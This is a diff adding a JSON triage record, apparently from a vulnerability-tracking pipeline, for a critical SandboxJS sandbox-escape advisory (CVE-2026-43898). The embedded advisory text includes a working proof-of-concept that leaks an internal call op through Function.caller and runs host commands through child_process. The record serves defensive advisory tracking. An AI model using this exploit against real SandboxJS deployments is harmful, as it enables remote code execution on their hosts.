@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/172206083?v=4\", \"events_url\": \"https://api.github.com/users/Macabely/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/Macabely/followers\", \"following_url\": \"https://api.github.com/users/Macabely/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/Macabely/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/Macabely\", \"id\": 172206083, \"login\": \"Macabely\", \"node_id\": \"U_kgDOCkOoAw\", \"organizations_url\": \"https://api.github.com/users/Macabely/orgs\", \"received_events_url\": \"https://api.github.com/users/Macabely/received_events\", \"repos_url\": \"https://api.github.com/users/Macabely/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/Macabely/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/Macabely/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/Macabely\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-43898\", \"cvss\": {\"score\": 10.0, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 10.0, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-94\", \"name\": \"Improper Control of Generation of Code ('Code Injection')\"}], \"description\": \"### Summary\\nSandbox-defined functions expose `Function.caller`, allowing sandboxed code to recover the internal `LispType.Call` runtime callback. That callback can then be invoked with attacker-controlled fake context and obj values to extract blocked host statics, recover the real host Function constructor, and execute arbitrary host JavaScript.\\n### Details\\n\\nThe vulnerability is in the property access logic registered via `addOps` in [prop.ts](https://github.com/nyariv/SandboxJS/blob/1e6785658c94f5f2fb8e4a02cfcf1e7821b8be7f/src/executor/ops/prop.ts#L10). Sandboxed code could access the `caller`, `callee`, and `arguments` properties on functions. In the CommonJS build, this allowed sandboxed code to read `Function.caller` and leak a privileged internal `LispType.Call` callback.\\n\\nIn [executorUtils.ts](https://github.com/nyariv/SandboxJS/blob/1e6785658c94f5f2fb8e4a02cfcf1e7821b8be7f/src/executor/executorUtils.ts#L239-L282) `createFunction()` constructs normal host JS functions, and because these are ordinary host functions, sandbox code can observe:\\n```js\\nfunction f(){ return f.caller }\\n```\\nThat leaks the host-side callback that invoked the sandbox function. This leaked callback is the internal `LispType.Call` op, which is registered in [call.ts](https://github.com/nyariv/SandboxJS/blob/1e6785658c94f5f2fb8e4a02cfcf1e7821b8be7f/src/executor/ops/call.ts#L16-L17). The escape was possible because the `LispType.Call` handler accepts a **params** object from the attacker and uses its fields without authenticating that they came from the executor. if you looked at those branches [call.ts:47](https://github.com/nyariv/SandboxJS/blob/1e6785658c94f5f2fb8e4a02cfcf1e7821b8be7f/src/executor/ops/call.ts#L47-L55), [call.ts:70](https://github.com/nyariv/SandboxJS/blob/1e6785658c94f5f2fb8e4a02cfcf1e7821b8be7f/src/executor/ops/call.ts#L70), [call.ts:149](https://github.com/nyariv/SandboxJS/blob/1e6785658c94f5f2fb8e4a02cfcf1e7821b8be7f/src/executor/ops/call.ts#L149-L153). This means the attacker controls `obj.context`, `obj.prop`, `obj.get`, `context.evals.get` and `a`. This can lead to direct invocation of an internal primitive with forged operands\\n\\n### PoC\\n```js\\nconst sandb = require('@nyariv/sandboxjs').default;\\nconst sand = new sandb(); \\n\\nconst payload = `\\nconst callOp = (function fn() { return fn.caller; })();\\n\\nfunction makeContext(capture = () => {}) {\\n  return { ctx: { options: 0 }, evals: { get: capture } };\\n}\\n\\nfunction leakStatic(obj, prop) {\\n  let leaked;\\n  callOp({\\n    done() {},\\n    a() {},\\n    b: [],\\n    obj: { context: obj, prop, get() {} },\\n    context: makeContext((fn) => (leaked = fn, () => 1))\\n  });\\n  return leaked;\\n}\\n\\nfunction callDirect(fn, args) {\\n  let value;\\n  callOp({\\n    done(_, result) { value = result; },\\n    a() {},\\n    b: args,\\n    obj: fn,\\n    context: makeContext()\\n  });\\n  return value;\\n}\\n\\ncallDirect(leakStatic(Object, 'defineProperty'), [\\n  leakStatic,\\n  'call',\\n  callDirect(leakStatic(Object, 'getOwnPropertyDescriptor'), [\\n    callDirect(leakStatic(Object, 'getPrototypeOf'), [() => 0]),\\n    'constructor'\\n  ])\\n]);\\n\\nlet hostFn;\\ncallOp({\\n  done(_, result) { hostFn = result; },\\n  a: leakStatic,\\n  b: [],\\n  obj: {\\n    context: 'return process.getBuiltinModule(\\\"child_process\\\").execSync(\\\"whoami\\\").toString()',\\n    get() {}\\n  },\\n  context: makeContext()\\n});\\n\\nreturn hostFn();\\n`;\\n\\nconsole.log(sand.compile(payload)().run());\\n```\\n### Impact\\n_Sandbox escape leads to RCE_\", \"epss\": {\"percentage\": 0.00472, \"percentile\": 0.37524}, \"ghsa_id\": \"GHSA-g8f2-4f4f-5jqw\", \"github_reviewed_at\": \"2026-05-11T19:40:00Z\", \"html_url\": \"https://github.com/advisories/GHSA-g8f2-4f4f-5jqw\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-g8f2-4f4f-5jqw\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-43898\"}], \"nvd_published_at\": \"2026-05-28T18:16:32Z\", \"published_at\": \"2026-05-11T19:40:00Z\", \"references\": [\"https://github.com/nyariv/SandboxJS/security/advisories/GHSA-g8f2-4f4f-5jqw\", \"https://github.com/nyariv/SandboxJS/commit/826865251232611ec94078bab5a18ec875dad4a5\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-43898\", \"https://github.com/advisories/GHSA-g8f2-4f4f-5jqw\"], \"repository_advisory_url\": \"https://api.github.com/repos/nyariv/SandboxJS/security-advisories/GHSA-g8f2-4f4f-5jqw\", \"severity\": \"critical\", \"source_code_location\": \"https://github.com/nyariv/SandboxJS\", \"summary\": \"SandboxJS has a sandbox escape via Function.caller leakage of internal call op\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-09T02:01:00Z\", \"url\": \"https://api.github.com/advisories/GHSA-g8f2-4f4f-5jqw\", \"vulnerabilities\": [{\"first_patched_version\": \"0.9.6\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"@nyariv/sandboxjs\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 0.9.5\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-g8f2-4f4f-5jqw",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "@nyariv/sandboxjs: <= 0.9.5"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-43898"
+    ],
+    "cvss_score": 10.0,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "@nyariv/sandboxjs"
+    ],
+    "remote": true,
+    "vendor_severity": "critical"
+  },
+  "first_seen_at": "2026-07-20T19:51:59.839798Z",
+  "provenance": {
+    "content_sha256": "5473f2e029863e1e1327ec346af572a08dce216472c15be1f291b6dced38b8bd",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-11T19:40:00Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-g8f2-4f4f-5jqw",
+  "status": "active",
+  "title": "SandboxJS has a sandbox escape via Function.caller leakage of internal call op",
+  "updated_at": "2026-06-09T02:01:00Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-g8f2-4f4f-5jqw"
+}
